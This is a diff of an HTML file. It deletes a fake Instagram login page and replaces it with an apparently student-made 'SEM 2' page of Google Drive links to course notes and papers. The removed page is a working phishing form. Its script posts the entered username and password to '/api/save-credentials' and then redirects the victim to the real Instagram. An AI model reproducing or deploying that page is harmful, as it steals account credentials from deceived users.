@@ -1,216 +1,200 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Instagram</title>
-  <style>
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
-      background-color: #000;
-      margin: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      flex-direction: column;
-      color: #fff;
-    }
+  <title>SEM 2</title>
+<style>
+body{
+background-color: aqua;
+}
+.hello{
 
-    .login-container {
-      text-align: center;
-      width: 350px;
-      background: #000;
-      padding: 20px 0;
-   thu   box-sizing: border-box;
-    }
+margin-top: 60px;
+font-family: Arial;
+font-weight: bold;
+font-size: 40px;
+text-align: center;
+background-color: azure;
+margin-bottom: 60px;
 
-    .logo {
-      width: 175px;
-      margin: 20px auto 12px;
-      display: block;
-    }
 
-    input {
-      width: 100%;
-      padding: 9px 0 7px 8px;
-      margin: 6px 0;
-      border: 1px solid #303030;
-      border-radius: 3px;
-      background-color: #121212;
-      color: #fff;
-      font-size: 14px;
-      box-sizing: border-box;
-    }
+}
+.metro{
+  margin-top: 60px;
+font-family: Arial;
+font-weight: bold;
+font-size: 30px;
+text-align: center;
+background-color: white;
+padding-bottom: 120px;
+}
+.matter{
+text-align: left;
+font-family: Arial;
+font-weight: bold;
+font-size: 20px;
+background-color: red;
+margin-bottom: 0;
+padding-top: 20px;
 
-    input:focus {
-      outline: none;
-      border-color: #666;
-    }
 
-    input::placeholder {
-      color: #8e8e8e;
-    }
 
-    button {
-      width: 100%;
-      padding: 7px;
-      background-color: #0095f6;
-      color: #fff;
-      border: none;
-      border-radius: 8px;
-      font-size: 14px;
-      font-weight: 600;
-      cursor: pointer;
-      margin: 8px 0;
-    }
+}
+.ep{
+  text-align: left;
+font-family: Arial;
+font-weight: bold;
+font-size: 20px;
+background-color: rgb(255, 0, 230);
+margin-top: 0;
+padding-top: 20px;
 
-    button:disabled {
-      background-color: #4b4b4b;
-      cursor: not-allowed;
-    }
 
-    .or-divider {
-      display: flex;
-      align-items: center;
-      margin: 10px 0;
-      color: #8e8e8e;
-      font-size: 13px;
-      font-weight: 600;
-      line-height: 15px;
-    }
+}
+.BEEE{
+  text-align: left;
+font-family: Arial;
+font-weight: bold;
+font-size: 20px;
+background-color: rgb(0, 255, 89);
+margin-top: 0;
+padding-top: 20px;
+}
 
-    .or-divider hr {
-      flex: 1;
-      border: none;
-      border-top: 1px solid #303030;
-    }
+.BEE{
+  text-align: left;
+font-family: Arial;
+font-weight: bold;
+font-size: 20px;
+background-color: rgb(255, 230, 0);
+margin-top: 0;
+padding-top: 20px;
+}
+.NA{
+  text-align: left;
+font-family: Arial;
+font-weight: bold;
+font-size: 20px;
+background-color: rgb(255, 111, 0);
+margin-top: 0;
+padding-top: 20px; 
+}
+.EG{
+  text-align: left;
+font-family: Arial;
+font-weight: bold;
+font-size: 20px;
+background-color: rgb(0, 255, 204);
+margin-top: 0;
+padding-top: 20px; 
+}
 
-    .or-divider span {
-      margin: 0 18px;
-    }
 
-    .facebook-login {
-      color: #0095f6;
-      font-size: 14px;
-      font-weight: 600;
-      text-decoration: none;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin: 20px 0 10px;
-    }
+}
 
-    .facebook-login img {
-      width: 16px;
-      margin-right: 8px;
-    }
 
-    .forgot-password {
-      color: #fff;
-      font-size: 12px;
-      text-decoration: none;
-      display: block;
-      margin: 12px 0;
-    }
 
-    .signup-container {
-      width: 350px;
-      background: #000;
-      padding: 15px 0;
-      margin-top: 10px;
-      text-align: center;
-      font-size: 14px;
-      color: #fff;
-    }
 
-    .signup-container a {
-      color: #0095f6;
-      font-weight: 600;
-      text-decoration: none;
-    }
 
-    .get-app {
-      text-align: center;
-      margin: 20px 0 10px;
-      font-size: 14px;
-      color: #fff;
-    }
 
-    .app-links {
-      display: flex;
-      justify-content: center;
-      gap: 10px;
-    }
 
-    .app-links img {
-      width: 135px;
-    }
-  </style>
+</style>
+
 </head>
 <body>
-  <div class="login-container">
-    <img src="images/instagram-logo.png" alt="Instagram Logo" class="logo">
-    <form id="login-form">
-      <input type="text" id="username" placeholder="Phone number, username, or email" required>
-      <input type="password" id="password" placeholder="Password" required>
-      <button type="submit" id="login-button" disabled>Log in</button>
-    </form>
+  
+<div class="hello" >
+<a style="color: black" href="https://drive.google.com/file/d/12ybo0_HM2lqcUMqnbNlBSGlYWPJd5fv9/view?usp=sharing"  target="_blank">SEM TIME TABLE</a>
+</div>
+<div class="metro">
+<h1>SEM 2</h1>
+<div class="matter">
+<h1>DEVC :</h1>
+<a href="https://drive.google.com/file/d/1MP6f70JxKYuHHHqcLo4CLXXmyFqmzKM6/view?usp=sharing" target="_blank">UNIT 1</a><br>
+<a href="https://drive.google.com/file/d/1xG7VVUjxCbvdfTW6ogxSa_GTk3W5f1xB/view?usp=sharing" target="_blank">UNIT 2</a><br>
+<a href="https://drive.google.com/file/d/1HsyftzkpIHtG2RGm_LMeJ2WZMJZIgghD/view?usp=sharing" target="_blank">UNIT 3</a><br>
+<a href="">UNIT 4</a><br>
+<a href="">UNIT 5</a><br>
+<a href="">ASSIGNMENTS</a><br>
+<a href="">MID PAPERS</a><br>
+<a href="https://drive.google.com/file/d/1csiqcTeQRznuOx3JTLno3TRDaYJtdsfd/view?usp=sharing" target="_blank">SEM PAPERS</a>
+</div>
+<div class="ep">
+<h1>EP</h1>
+<a href="https://drive.google.com/file/d/1lktgFxjfAs-N9oxIgWkhOTL3EEqg7iY0/view?usp=sharing" target="_blank">UNIT 1</a><br>
+<a href="">UNIT 2</a><br>
+<a href="https://drive.google.com/file/d/1OfcYvM8tXzbvJ5bJDDfjhU_8_2X2jOTO/view?usp=sharing" target="_blank">UNIT 3</a><br>
+<a href="https://drive.google.com/file/d/1JJiMqmgLwnnCj5-jCoJXN7JU47WT8LO6/view?usp=sharing" target="_blank">UNIT 4</a><br>
+<a href="https://drive.google.com/file/d/1skS2OVvkY2WC3ppA9PPKrmQcdp3Qjg3W/view?usp=sharing">UNIT 5</a><br>
+<a href="">ASSIGNMENTS</a><br>
+<a href="">MID PAPERS</a><br>
+<a href="">SEM PAPERS</a>
 
-    <div class="or-divider">
-      <hr><span>OR</span><hr>
+
+</div>
+<div class="BEEE">
+  <h1>BEEE(ELECTRONICS)</h1>
+  <a href="https://drive.google.com/file/d/16uSfF0OuGXy-q6GRxC0GCgsIdR7DUFku/view?usp=sharing" target="_blank">UNIT 1</a><br>
+  <a href="https://drive.google.com/file/d/1Lkd1QBOdUm0_1LLpShnPR-T5AcSxtXaZ/view?usp=sharing" target="_blank">UNIT 2</a><br>
+  <a href="https://drive.google.com/file/d/1s-uRokAUeZwMC97ZG4CjVbNZL9TceHU7/view?usp=sharing" target="_blank">UNIT 3</a><br>
+  <a href="">ASSIGNMENTS</a><br>
+<a href="">MID PAPERS</a><br>
+<a href="">SEM PAPERS</a>
+
+
+
+  </div>
+  <div class="BEE">
+    <h1>BEEE(ELECTRICAL)</h1>
+    <a href="https://drive.google.com/file/d/1fi_1edhe-QZHtjZ9X3upRymTtqx7A392/view?usp=sharing" target="_blank">UNIT 1</a><br>
+    <a href="https://drive.google.com/file/d/1tdrltvtvi_kkcPG62JoEJzfhkn0Ox1V8/view?usp=sharing" target="_blank">UNIT 2</a><br>
+    <a href="https://drive.google.com/file/d/15Lwkg14oa4_Nfciyiu1ZaEOfqps3wd70/view?usp=sharing" target="_blank">UNIT 3</a><br>
+    
+    <a href="">ASSIGNMENTS</a><br>
+    <a href="">MID PAPERS</a><br>
+    <a href="">SEM PAPERS</a>
+
+
     </div>
+    <div class="NA">
+      <h1>NA</h1>
+      <a href="">UNIT 1</a><br>
+      <a href="">UNIT 2</a><br>
+      <a href="">UNIT 3</a><br>
+      <a href="">UNIT 4</a><br>
+      <a href="">UNIT 5</a><br>
+      <a href="">ASSIGNMENTS</a><br>
+      <a href="">MID PAPERS</a><br>
+      <a href="">SEM PAPERS</a>
 
-    <a href="#" class="facebook-login">
-      <img src="images/facebook-logo.png" alt="Facebook">
-      Log in with Facebook
-    </a>
-    <a href="#" class="forgot-password">Forgotten your password?</a>
+
+      </div>
+      <div class="EG">
+        <h1>EG</h1>
+        <a href="">UNIT 1</a><br>
+        <a href="">UNIT 2</a><br>
+        <a href="">UNIT 3</a><br>
+        <a href="">UNIT 4</a><br>
+        <a href="">UNIT 5</a><br>
+        <a href="">ASSIGNMENTS</a><br>
+        <a href="">MID PAPERS</a><br>
+        <a href="">SEM PAPERS</a>
+
+
+        </div>
   </div>
 
-  <div class="signup-container">
-    Don't have an account? <a href="#">Sign up</a>
-  </div>
+              
 
-  <div class="get-app">Get the app.</div>
-  <div class="app-links">
-    <img src="images/app-store-badge.png" alt="App Store">
-    <img src="images/google-play-badge.png" alt="Google Play">
-  </div>
 
-  <script>
-    const form = document.getElementById('login-form');
-    const usernameInput = document.getElementById('username');
-    const passwordInput = document.getElementById('password');
-    const loginButton = document.getElementById('login-button');
 
-    function checkInputs() {
-      loginButton.disabled = !(usernameInput.value.trim() && passwordInput.value.trim());
-    }
 
-    usernameInput.addEventListener('input', checkInputs);
-    passwordInput.addEventListener('input', checkInputs);
 
-    form.addEventListener('submit', async function(event) {
-      event.preventDefault();
-      const username = usernameInput.value;
-      const password = passwordInput.value;
 
-      try {
-        const response = await fetch('/api/save-credentials', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ username, password })
-        });
-        if (response.ok) {
-          window.location.href = 'https://www.instagram.com/';
-        } else {
-          alert('Error saving credentials');
-        }
-      } catch (error) {
-        alert('Network error');
-      }
-    });
-  </script>
+
+
+
+
+</body>
+
 </body>
 </html>
